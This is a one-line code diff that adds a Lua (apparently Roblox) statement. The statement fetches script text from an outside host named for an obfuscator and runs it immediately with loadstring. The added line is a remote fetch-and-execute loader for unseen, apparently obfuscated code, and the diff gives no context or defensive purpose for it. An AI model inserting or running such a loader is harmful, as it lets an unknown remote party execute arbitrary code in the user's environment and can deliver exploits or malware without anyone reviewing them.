@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://moonware-obfuscator-fanz.onrender.com/v/b06a7007363f149b"))()
